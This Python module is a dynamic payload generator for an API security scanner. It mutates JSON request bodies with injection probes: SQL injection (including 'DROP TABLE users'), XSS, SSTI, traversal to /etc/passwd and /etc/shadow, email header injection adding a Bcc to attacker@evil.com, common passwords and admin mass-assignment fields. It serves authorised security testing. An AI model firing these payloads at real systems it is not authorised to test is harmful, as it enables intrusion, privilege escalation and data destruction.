"""
scanners/auto_payload_generator.py
-----------------------------------
Dynamic Payload Generator.

Analyses the structure (JSON schema) of an API request body and generates
context-aware attack payloads tailored to the specific field names, types, and
values it observes — with no static wordlists required.

Supported payload categories (selected automatically per field):
  - IDOR / Insecure Direct Object Reference  (numeric IDs → ±1, 0, -1, max)
  - SQL Injection                             (string / numeric fields)
  - NoSQL Injection                           (MongoDB operator injection)
  - Business Logic                            (negative amounts, zero, overflow)
  - Mass Assignment                           (privilege-escalation field injection)
  - XSS (reflected)                           (string fields)
  - Path Traversal                            (file/path-like fields)
  - SSTI                                      (template engine probe strings)
  - Format String                             (string fields)
  - Type Confusion                            (wrong type for a field)
"""

from __future__ import annotations

import copy
import itertools
import logging
from typing import Any, Dict, Generator, List, Optional, Tuple

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Field-type inference
# ---------------------------------------------------------------------------

class _FieldKind:
    NUMERIC_ID = "numeric_id"       # e.g. user_id, order_id, item_id
    AMOUNT      = "amount"          # e.g. price, amount, balance, quantity
    STRING_ID   = "string_id"       # UUID / slug that looks like an identifier
    EMAIL       = "email"
    PASSWORD    = "password"
    PATH        = "path"            # file / path-like fields
    BOOLEAN     = "boolean"
    GENERIC_STR = "generic_str"
    GENERIC_NUM = "generic_num"


_NUMERIC_ID_NAMES = {
    "id", "user_id", "account_id", "order_id", "item_id", "product_id",
    "invoice_id", "transaction_id", "resource_id", "object_id", "record_id",
    "entity_id", "doc_id", "post_id", "comment_id", "message_id", "file_id",
}

_AMOUNT_NAMES = {
    "amount", "price", "balance", "quantity", "qty", "cost", "value",
    "total", "subtotal", "fee", "discount", "credit", "debit", "points",
    "tokens", "coins",
}

_PATH_NAMES = {
    "path", "file", "filename", "filepath", "directory", "folder",
    "url", "uri", "src", "href", "source", "destination", "dest",
}

_PASSWORD_NAMES = {"password", "passwd", "pass", "secret", "pin", "passphrase"}

_EMAIL_NAMES = {"email", "mail", "e_mail", "emailaddress"}


def _infer_field_kind(key: str, value: Any) -> str:
    """Infer the semantic kind of a field from its name and current value."""
    key_lower = key.lower().replace("-", "_").replace(" ", "_")

    if key_lower in _NUMERIC_ID_NAMES:
        return _FieldKind.NUMERIC_ID
    if key_lower in _AMOUNT_NAMES:
        return _FieldKind.AMOUNT
    if key_lower in _PATH_NAMES:
        return _FieldKind.PATH
    if key_lower in _PASSWORD_NAMES:
        return _FieldKind.PASSWORD
    if key_lower in _EMAIL_NAMES:
        return _FieldKind.EMAIL

    if isinstance(value, bool):
        return _FieldKind.BOOLEAN
    if isinstance(value, (int, float)):
        # NUMERIC_ID case was already handled above; any remaining numeric
        # field that did not match a known ID name is a generic number.
        return _FieldKind.GENERIC_NUM
    if isinstance(value, str):
        # Heuristic: looks like UUID / short slug identifier?
        import re
        if re.fullmatch(r'[0-9a-f\-]{8,36}', value, re.IGNORECASE):
            return _FieldKind.STRING_ID
        return _FieldKind.GENERIC_STR

    return _FieldKind.GENERIC_STR


# ---------------------------------------------------------------------------
# Per-kind payload tables
# ---------------------------------------------------------------------------

def _payloads_for_numeric_id(original: Any) -> List[Any]:
    """IDOR-focused payloads for numeric identifier fields."""
    try:
        v = int(original)
    except (TypeError, ValueError):
        v = 1
    return [
        v + 1, v - 1, 0, -1, -v,
        1, 2, 100, 99999, 2**31 - 1, 2**32,
        "0", "-1", "null", "undefined", "NaN", "Infinity",
        str(v) + " OR 1=1",                # SQLi probe
        str(v) + "' OR '1'='1",            # SQLi probe
        {"$gt": 0},                        # NoSQL injection
        [v, v + 1],                        # Array confusion
    ]


def _payloads_for_amount(original: Any) -> List[Any]:
    """Business-logic payloads for monetary / quantity fields."""
    try:
        v = float(original)
    except (TypeError, ValueError):
        v = 1.0
    return [
        -v, -1, 0, 0.0, 0.001, -0.01,
        v * 100, v * 1000,
        2**31 - 1, 2**32, -2**31,
        9999999999999999,
        "0", "-1", "-99.99",
        "1e308",           # Float overflow probe
        "NaN", "Infinity", "-Infinity",
        str(v) + " OR 1=1",
    ]


def _payloads_for_string(original: str) -> List[Any]:
    """Generic string field payloads: SQLi, XSS, SSTI, path traversal."""
    return [
        # SQL Injection
        "' OR '1'='1",
        "' OR '1'='1' --",
        "\" OR \"1\"=\"1",
        "1; DROP TABLE users--",
        "' UNION SELECT NULL--",
        "' UNION SELECT 1,2,3--",
        # NoSQL Injection
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "1==1"}',
        # XSS
        "<script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
        "javascript:alert(1)",
        # SSTI
        "{{7*7}}",
        "${7*7}",
        "<%=7*7%>",
        # Format string
        "%s%s%s%s",
        "%n%n%n",
        # Null / empty
        "", "null", "undefined", "None",
        # Boundary
        "A" * 1024,
        "A" * 10000,
        # Unicode / encoding
        "\u0000",
        "\r\n",
        # Original with whitespace / case mutations
        original.strip() if isinstance(original, str) else original,
        original.upper() if isinstance(original, str) else original,
    ]


def _payloads_for_path(original: str) -> List[Any]:
    """Path traversal payloads for file / URL / path-like fields."""
    return [
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/shadow",
        "..%2Fetc%2Fpasswd",
        "..%252Fetc%252Fpasswd",
        "/etc/passwd",
        "/proc/self/environ",
        "C:\\Windows\\system32\\drivers\\etc\\hosts",
        "C:/Windows/system32/drivers/etc/hosts",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "file:///etc/passwd",
        original,  # Baseline
    ]


def _payloads_for_email(original: str) -> List[Any]:
    """Email field injection payloads."""
    return [
        "test@test.com",
        "admin@localhost",
        "' OR 1=1--@x.com",
        "victim@target.com\r\nBcc: attacker@evil.com",
        "test+payload@test.com",
        "test@test.com\nCc: attacker@evil.com",
        "<script>alert(1)</script>@evil.com",
        original,
    ]


def _payloads_for_password(original: str) -> List[Any]:
    """Password / secret field payloads."""
    return [
        "", "null", "undefined",
        "' OR '1'='1",
        "admin", "password", "123456", "qwerty", "letmein",
        "' OR 1=1--",
        "A" * 1024,
        original,
    ]


def _payloads_for_boolean(original: Any) -> List[Any]:
    """Boolean field payloads."""
    return [True, False, 1, 0, "true", "false", "True", "False", "1", "0", None]


def _payloads_for_generic_num(original: Any) -> List[Any]:
    """Generic number field payloads."""
    return _payloads_for_amount(original)


# ---------------------------------------------------------------------------
# Mass-assignment injection fields
# ---------------------------------------------------------------------------

_MASS_ASSIGNMENT_FIELDS: Dict[str, Any] = {
    "role": "admin",
    "is_admin": True,
    "admin": True,
    "is_superuser": True,
    "verified": True,
    "balance": 99999,
    "credits": 99999,
    "permissions": ["read", "write", "delete", "admin"],
    "subscription": "premium",
    "plan": "enterprise",
    "status": "active",
    "email_verified": True,
    "phone_verified": True,
}


# ---------------------------------------------------------------------------
# Payload generator
# ---------------------------------------------------------------------------

class AutoPayloadGenerator:
    """
    Analyses a JSON request body and produces a list of mutated request bodies,
    each targeting a specific vulnerability class.

    Usage::

        gen = AutoPayloadGenerator()
        request_body = {"user_id": 123, "amount": 50.00, "note": "Hello"}

        for mutation in gen.generate(request_body):
            print(mutation)
            # → {"user_id": 124, "amount": 50.0, "note": "Hello"}   ← IDOR
            # → {"user_id": 123, "amount": -50.0, "note": "Hello"}  ← Biz Logic
            # → ...
    """

    def generate(
        self,
        body: Dict[str, Any],
        include_mass_assignment: bool = True,
    ) -> List[Dict[str, Any]]:
        """
        Generate a flat list of mutated request bodies from *body*.

        Each mutation changes exactly ONE field (single-field fuzzing) so the
        root cause of any finding is immediately clear.  A final batch injects
        all mass-assignment fields at once.

        Parameters
        ----------
        body:
            The original JSON request body to fuzz.
        include_mass_assignment:
            If True, append a mass-assignment mutation that injects privileged
            fields into the body.
        """
        mutations: List[Dict[str, Any]] = []

        for key, original_value in body.items():
            kind = _infer_field_kind(key, original_value)
            payloads = self._get_payloads(kind, original_value)
            for payload in payloads:
                mutated = copy.deepcopy(body)
                mutated[key] = payload
                mutated["_fuzz_meta"] = {
                    "field": key,
                    "kind": kind,
                    "original": original_value,
                    "payload": str(payload)[:120],
                }
                mutations.append(mutated)

        if include_mass_assignment:
            mass = copy.deepcopy(body)
            mass.update(_MASS_ASSIGNMENT_FIELDS)
            mass["_fuzz_meta"] = {
                "field": "<mass_assignment>",
                "kind": "mass_assignment",
                "original": None,
                "payload": str(list(_MASS_ASSIGNMENT_FIELDS.keys())),
            }
            mutations.append(mass)

        logger.info(
            "[PayloadGen] Generated %d mutations for body with %d fields",
            len(mutations), len(body),
        )
        return mutations

    def generate_for_field(
        self,
        key: str,
        value: Any,
    ) -> List[Any]:
        """
        Return just the payload list for a single field, without building
        full request body copies.  Useful when the caller manages body assembly.
        """
        kind = _infer_field_kind(key, value)
        return self._get_payloads(kind, value)

    def describe(self, body: Dict[str, Any]) -> Dict[str, str]:
        """
        Return a dict mapping each field name to its inferred kind.
        Useful for debugging or logging what the generator detected.
        """
        return {k: _infer_field_kind(k, v) for k, v in body.items()}

    # ------------------------------------------------------------------
    # Internal dispatch
    # ------------------------------------------------------------------

    @staticmethod
    def _get_payloads(kind: str, original: Any) -> List[Any]:
        dispatch = {
            _FieldKind.NUMERIC_ID:  _payloads_for_numeric_id,
            _FieldKind.AMOUNT:      _payloads_for_amount,
            _FieldKind.STRING_ID:   lambda v: _payloads_for_string(str(v)),
            _FieldKind.GENERIC_STR: lambda v: _payloads_for_string(str(v)),
            _FieldKind.PATH:        lambda v: _payloads_for_path(str(v)),
            _FieldKind.EMAIL:       lambda v: _payloads_for_email(str(v)),
            _FieldKind.PASSWORD:    lambda v: _payloads_for_password(str(v)),
            _FieldKind.BOOLEAN:     _payloads_for_boolean,
            _FieldKind.GENERIC_NUM: _payloads_for_generic_num,
        }
        fn = dispatch.get(kind, lambda v: _payloads_for_string(str(v)))
        return fn(original)
